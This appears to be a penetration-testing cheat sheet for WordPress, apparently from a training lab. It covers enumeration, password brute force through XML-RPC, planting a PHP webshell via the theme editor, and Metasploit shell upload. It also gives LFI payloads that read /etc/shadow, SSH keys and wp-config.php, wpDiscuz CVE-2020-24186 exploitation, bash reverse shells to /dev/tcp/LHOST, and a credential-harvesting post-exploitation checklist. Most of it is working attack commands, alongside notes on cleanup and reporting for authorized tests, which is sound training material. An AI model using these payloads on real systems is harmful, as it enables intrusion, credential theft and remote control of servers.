## Discovery & Footprinting

### robots.txt

Always check `/robots.txt` first — presence of `/wp-admin/` or `/wp-content/` is a dead giveaway.

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://TARGET/wp-sitemap.xml
```

### Confirm WordPress via page source

```bash
# Detect WP and grab version
curl -s http://TARGET/ | grep WordPress

# Expected output:
# <meta name="generator" content="WordPress 5.8" />
```

### Version from RSS feed

```
http://TARGET/?feed=rss2
# Look for: <generator>https://wordpress.org/?v=5.8</generator>
```

## Manual Enumeration

### Enumerate active theme

```bash
curl -s http://TARGET/ | grep themes
# Look for: /wp-content/themes/THEME-NAME/
```

### Enumerate plugins (check multiple pages)

```bash
# Homepage
curl -s http://TARGET/ | grep plugins

# Post pages often load different plugins
curl -s http://TARGET/?p=1 | grep plugins

# Look for ?ver=X.X.X in JS/CSS URLs — that's the plugin version
```

### Fingerprint plugin version via readme

```bash
# If directory listing is on:
curl -s http://TARGET/wp-content/plugins/PLUGIN-NAME/readme.txt
# Look for: Stable tag: 1.0.0
```

### Check wp-config.php (post-exploitation)

```
/var/www/html/wp-config.php
# Contains: DB_NAME, DB_USER, DB_PASSWORD, DB_HOST
```

## WPScan Automated Enumeration

### Install

```bash
sudo gem install wpscan
```

### Full enumeration with vulnerability data

```bash
sudo wpscan --url http://TARGET --enumerate --api-token YOUR_TOKEN
```

> Get free API token (25 req/day) at: https://wpvulndb.com/users/sign_up

### Common flags

| Flag                          | Purpose                                     |
| ----------------------------- | ------------------------------------------- |
| `--enumerate`                 | All: plugins, themes, users, media, backups |
| `--enumerate ap`              | All plugins                                 |
| `--enumerate at`              | All themes                                  |
| `--enumerate u`               | Users                                       |
| `--api-token TOKEN`           | Pull CVE/vuln data from WPVulnDB            |
| `-t 20`                       | Set threads (default: 5)                    |
| `--detection-mode aggressive` | More thorough scan                          |

```bash
# Plugins only
sudo wpscan --url http://TARGET --enumerate ap --api-token TOKEN

# Users only
sudo wpscan --url http://TARGET --enumerate u

# Aggressive with more threads
sudo wpscan --url http://TARGET --enumerate -t 20 --api-token TOKEN
```

> **Note:** WPScan alone is not enough. It missed wpDiscuz and Contact Form 7 in manual testing. Always combine with manual enumeration.

## User Enumeration

### Via login error messages (manual)

Navigate to `/wp-login.php` and test usernames:

| Input                           | Response                                                 | Meaning                 |
| ------------------------------- | -------------------------------------------------------- | ----------------------- |
| Valid username + wrong password | `"The password for username admin is incorrect."`        | Username EXISTS         |
| Invalid username                | `"The username someone is not registered on this site."` | Username does NOT exist |

### Via author ID brute force

```bash
curl -s http://TARGET/?author=1
curl -s http://TARGET/?author=2
# Redirects to /author/USERNAME/ if user exists
```

### Via page source

```bash
# Author names sometimes appear in post metadata
curl -s http://TARGET/ | grep -i "author"
```

## Attack — Login Bruteforce

### Via XML-RPC (preferred — faster)

```bash
sudo wpscan --password-attack xmlrpc \
  -t 20 \
  -U john \
  -P /usr/share/wordlists/rockyou.txt \
  --url http://TARGET
```

### Via wp-login (standard)

```bash
sudo wpscan --password-attack wp-login \
  -t 20 \
  -U admin,john \
  -P /usr/share/wordlists/rockyou.txt \
  --url http://TARGET
```

### Multiple users from file

```bash
sudo wpscan --password-attack xmlrpc \
  -U users.txt \
  -P /usr/share/wordlists/rockyou.txt \
  --url http://TARGET
```

> **Tip:** XML-RPC method is faster because it batches requests through `/xmlrpc.php` rather than the web form.

## Attack — RCE via Theme Editor

**Requires:** Admin credentials

### Steps

1. Log in at `http://TARGET/wp-login.php`
2. Go to **Appearance → Theme Editor**
3. Select an **inactive theme** (e.g. Twenty Nineteen) — never edit the active theme
4. Open `404.php`
5. Add this line below the comments:

```php
<?php system($_GET[0]); ?>
```

6. Click **Update File**
7. Trigger the webshell:

```bash
curl http://TARGET/wp-content/themes/twentynineteen/404.php?0=id

# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Execute reverse shell

```bash
# URL-encoded reverse shell via webshell
curl "http://TARGET/wp-content/themes/twentynineteen/404.php?0=bash+-c+'bash+-i+>%26+/dev/tcp/LHOST/4444+0>%261'"
```

## Attack — RCE via Metasploit

**Requires:** Admin credentials  
**Module:** `exploit/unix/webapp/wp_admin_shell_upload`  
**What it does:** Uploads a malicious plugin → executes PHP Meterpreter shell

```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload

msf6 > set username john
msf6 > set password firebird1
msf6 > set lhost 10.10.14.15
msf6 > set rhost 10.129.42.195
msf6 > set VHOST blog.inlanefreight.local   # Required if virtual hosting is used

msf6 > show options    # Verify before running
msf6 > exploit

meterpreter > getuid
# Server username: www-data (33)
```

> **Important:** If you don't set VHOST, exploit fails with: `"The target does not appear to be using WordPress."`

> **Cleanup:** Module tries to delete uploaded files but may fail. Verify and document all artifacts.

## Exploit — mail-masta LFI

**Plugin:** mail-masta v1.0.0  
**Auth required:** None (unauthenticated)  
**Vuln:** No input validation on `pl` GET parameter → Local File Inclusion  
**Also:** SQL Injection via `camp_id` POST parameter

### Vulnerable code

```php
<?php
include($_GET['pl']);   // No sanitization whatsoever
// ...
$count = $wpdb->get_results("SELECT count(*) co from $masta_reports where camp_id=$camp_id");
```

### Exploitation

```bash
# Read /etc/passwd
curl -s "http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

# Read wp-config.php (DB credentials)
curl -s "http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=../../wp-config.php"

# Read SSH keys
curl -s "http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/home/USER/.ssh/id_rsa"

# Read /etc/shadow (if permissions allow)
curl -s "http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/shadow"
```

## Exploit — wpDiscuz RCE

**Plugin:** wpDiscuz v7.0.4  
**CVE:** CVE-2020-24186  
**Auth required:** None (unauthenticated)  
**Vuln:** MIME type detection bypass → upload PHP webshell as fake image  
**Active installs at time of writing:** 90,000+

### Exploitation

```bash
# Run exploit script
python3 wp_discuz.py -u http://TARGET -p /?p=1

# If script RCE fails (common), use curl with the uploaded shell path
# Shell is uploaded to /wp-content/uploads/YEAR/MONTH/
curl -s "http://TARGET/wp-content/uploads/2021/08/SHELL_NAME.php?cmd=id"

# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Get reverse shell

```bash
curl -s "http://TARGET/wp-content/uploads/2021/08/SHELL_NAME.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/LHOST/4444+0>%261'"
```

> **Always clean up** the uploaded `.php` file after testing and document it in the report.

## User Roles

|Role|Access Level|Notes|
|---|---|---|
|**Administrator**|Full|Add/delete users, edit source code → **RCE**|
|**Editor**|High|Manage all posts incl. others'|
|**Author**|Medium|Own posts only|
|**Contributor**|Low|Write only, cannot publish|
|**Subscriber**|Minimal|Read posts, edit own profile|

> Getting **Administrator** access is usually sufficient for code execution on the server.  
> Editors/Authors may have access to vulnerable plugins that standard users don't.

## Methodology Notes

### Enumeration order

```
1. Check /robots.txt
2. View page source → grep for WordPress, themes, plugins
3. Check ?p=1, ?p=2 etc. for different plugin loads
4. Read plugin readme.txt files for version numbers
5. Run WPScan with API token
6. Manual user enumeration via /wp-login.php
7. Cross-reference findings — scanners miss things
```

### Why manual + automated both matter

- WPScan missed `wpDiscuz` and `Contact Form 7` in the example scan
- WPScan identified the correct theme (`Transport Gravity`) while manual grep found the parent (`Business Gravity`)
- WPScan found an extra user (`john`) not found manually
- **Neither alone is sufficient**

### Plugin hunting tips

- `?ver=X.X.X` in JS/CSS `src` URLs = plugin version (fastest method)
- Check `/wp-content/plugins/PLUGIN/readme.txt` when directory listing is enabled
- Use `waybackurls` to find old/forgotten plugins still on disk
- Old unused plugins are still exploitable even if not actively used by the site

## Post-Exploitation Checklist

```bash
# Confirm execution context
id
whoami
hostname
uname -a

# Grab DB credentials
cat /var/www/html/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST"

# Check for other users
cat /etc/passwd | grep -v nologin

# Look for SSH keys
ls -la /home/*/
ls -la /root/.ssh/

# Check cron jobs
crontab -l
cat /etc/crontab

# SUID binaries (privesc)
find / -perm -u=s -type f 2>/dev/null

# Network recon
ip a
ss -tnlp
cat /etc/hosts
```

## Reporting Artifacts

After every assessment, document the following in the report appendix:

- [ ] **Exploited systems** — hostname/IP + exploitation method used
- [ ] **Compromised users** — account name, how compromised, local or domain
- [ ] **Artifacts created** — all files uploaded/created on target (shells, plugins, etc.)
- [ ] **Changes made** — any config modifications (added users, group membership changes)
- [ ] **Cleanup confirmation** — all test artifacts removed or listed if removal failed
